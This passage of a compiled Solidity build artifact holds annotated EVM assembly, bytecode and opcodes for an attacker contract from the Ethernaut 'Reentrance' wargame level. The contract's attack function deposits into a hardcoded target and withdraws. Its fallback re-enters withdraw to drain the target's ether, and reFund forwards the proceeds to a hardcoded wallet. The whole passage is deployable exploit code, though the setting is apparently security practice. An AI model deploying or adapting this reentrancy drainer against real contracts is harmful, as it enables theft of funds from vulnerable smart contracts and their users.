pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1253:1254  0 */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1229:1250  address(this).balance */\n      selfbalance\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1229:1254  address(this).balance > 0 */\n      gt\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1221:1255  require(address(this).balance > 0) */\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1267:1279  bool success */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1292:1300  myWallet */\n      dup2\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1284:1306  payable(myWallet).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1314:1335  address(this).balance */\n      selfbalance\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1284:1340  payable(myWallet).call{value: address(this).balance}(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_37\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_36)\n    tag_37:\n      0x60\n      swap2\n      pop\n    tag_36:\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1266:1340  (bool success,) = payable(myWallet).call{value: address(this).balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1360:1367  success */\n      dup1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1351:1384  require (success,\"reFund failed\") */\n      tag_38\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x0d\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x726546756e64206661696c656400000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_38:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1097:1392  function reFund() public payable {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1400:1503  function getBalance() public view returns(uint256){\r... */\n    tag_29:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1442:1449  uint256 */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1468:1470  re */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1468:1480  re.balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1489:1493  this */\n      address\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1468:1495  re.balanceOf(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_40\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_40:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_42\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_42:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_43\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_43:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1461:1495  return re.balanceOf(address(this)) */\n      swap1\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1400:1503  function getBalance() public view returns(uint256){\r... */\n      swap1\n      jump\t// out\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":945:1089  function attack() public payable {\r... */\n    tag_31:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":989:991  re */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":989:998  re.donate */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x362a95\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1006:1026  1000000000000000 wei */\n      0x038d7ea4c68000\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1036:1040  this */\n      address\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":989:1042  re.donate{value: 1000000000000000 wei}(address(this)) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_45\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_45:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_47\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_47:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1053:1055  re */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1053:1064  re.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1065:1080  100000000000000 */\n      0x5af3107a4000\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1053:1081  re.withdraw(100000000000000) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":945:1089  function attack() public payable {\r... */\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220d6b017c6754ca207942f88d217fde26d79931507b15f2bec6bba74c264f0810164736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405273a7b6f4ca1d75a987bc1ac27c2ada78edfb1640846000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100c557600080fd5b5061067c806100d56000396000f3fe6080604052600436106100435760003560e01c8063087d01df146102c45780630ff0a4df146102ef57806312065fe0146102f95780639e5faafc14610324576102bf565b366102bf576000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156100d357600080fd5b505afa1580156100e7573d6000803e3d6000fd5b505050506040513d60208110156100fd57600080fd5b8101908080519060200190929190505050905060008111156102bc57655af3107a400060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156101f657600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d655af3107a40006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156101d957600080fd5b505af11580156101ed573d6000803e3d6000fd5b505050506102bb565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156102a257600080fd5b505af11580156102b6573d6000803e3d6000fd5b505050505b5b50005b600080fd5b3480156102d057600080fd5b506102d961032e565b6040518082815260200191505060405180910390f35b6102f7610336565b005b34801561030557600080fd5b5061030e61043c565b6040518082815260200191505060405180910390f35b61032c610507565b005b600047905090565b6000732797f5291a7faa3368ff031807b6b70c7bbeef6590506000471161035c57600080fd5b60008173ffffffffffffffffffffffffffffffffffffffff164760405180600001905060006040518083038185875af1925050503d80600081146103bc576040519150601f19603f3d011682016040523d82523d6000602084013e6103c1565b606091505b5050905080610438576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600d8152602001807f726546756e64206661696c65640000000000000000000000000000000000000081525060200191505060405180910390fd5b5050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156104c757600080fd5b505afa1580156104db573d6000803e3d6000fd5b505050506040513d60208110156104f157600080fd5b8101908080519060200190929190505050905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a9566038d7ea4c68000306040518363ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b15801561059857600080fd5b505af11580156105ac573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d655af3107a40006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561062c57600080fd5b505af1158015610640573d6000803e3d6000fd5b5050505056fea2646970667358221220d6b017c6754ca207942f88d217fde26d79931507b15f2bec6bba74c264f0810164736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xA7B6F4CA1D75A987BC1AC27C2ADA78EDFB164084 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0xC5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x67C DUP1 PUSH2 0xD5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x87D01DF EQ PUSH2 0x2C4 JUMPI DUP1 PUSH4 0xFF0A4DF EQ PUSH2 0x2EF JUMPI DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x2F9 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x324 JUMPI PUSH2 0x2BF JUMP JUMPDEST CALLDATASIZE PUSH2 0x2BF JUMPI PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xFD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP SWAP1 POP PUSH1 0x0 DUP2 GT ISZERO PUSH2 0x2BC JUMPI PUSH6 0x5AF3107A4000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0x1F6 JUMPI PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH6 0x5AF3107A4000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1D9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1ED JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x2BB JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2B6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST JUMPDEST POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2D0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2D9 PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2F7 PUSH2 0x336 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x305 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x30E PUSH2 0x43C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x32C PUSH2 0x507 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0x2797F5291A7FAA3368FF031807B6B70C7BBEEF65 SWAP1 POP PUSH1 0x0 SELFBALANCE GT PUSH2 0x35C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFBALANCE PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x3BC JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x3C1 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x438 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xD DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x726546756E64206661696C656400000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x4DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x362A95 PUSH7 0x38D7EA4C68000 ADDRESS PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x598 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5AC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH6 0x5AF3107A4000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x62C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x640 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD6 0xB0 OR 0xC6 PUSH22 0x4CA207942F88D217FDE26D79931507B15F2BEC6BBA74 0xC2 PUSH5 0xF081016473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "798:1133:1:-:0;;;852:42;819:76;;;;;;;;;;;;;;;;;;;;929:6;;;;;;;;;;902:34;;;;;;;;;;;;;;;;;;;;798:1133;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100435760003560e01c8063087d01df146102c45780630ff0a4df146102ef57806312065fe0146102f95780639e5faafc14610324576102bf565b366102bf576000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156100d357600080fd5b505afa1580156100e7573d6000803e3d6000fd5b505050506040513d60208110156100fd57600080fd5b8101908080519060200190929190505050905060008111156102bc57655af3107a400060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156101f657600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d655af3107a40006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156101d957600080fd5b505af11580156101ed573d6000803e3d6000fd5b505050506102bb565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156102a257600080fd5b505af11580156102b6573d6000803e3d6000fd5b505050505b5b50005b600080fd5b3480156102d057600080fd5b506102d961032e565b6040518082815260200191505060405180910390f35b6102f7610336565b005b34801561030557600080fd5b5061030e61043c565b6040518082815260200191505060405180910390f35b61032c610507565b005b600047905090565b6000732797f5291a7faa3368ff031807b6b70c7bbeef6590506000471161035c57600080fd5b60008173ffffffffffffffffffffffffffffffffffffffff164760405180600001905060006040518083038185875af1925050503d80600081146103bc576040519150601f19603f3d011682016040523d82523d6000602084013e6103c1565b606091505b5050905080610438576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600d8152602001807f726546756e64206661696c65640000000000000000000000000000000000000081525060200191505060405180910390fd5b5050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156104c757600080fd5b505afa1580156104db573d6000803e3d6000fd5b505050506040513d60208110156104f157600080fd5b8101908080519060200190929190505050905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a9566038d7ea4c68000306040518363ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b15801561059857600080fd5b505af11580156105ac573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d655af3107a40006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561062c57600080fd5b505af1158015610640573d6000803e3d6000fd5b5050505056fea2646970667358221220d6b017c6754ca207942f88d217fde26d79931507b15f2bec6bba74c264f0810164736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x87D01DF EQ PUSH2 0x2C4 JUMPI DUP1 PUSH4 0xFF0A4DF EQ PUSH2 0x2EF JUMPI DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x2F9 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x324 JUMPI PUSH2 0x2BF JUMP JUMPDEST CALLDATASIZE PUSH2 0x2BF JUMPI PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD3 JUMPI 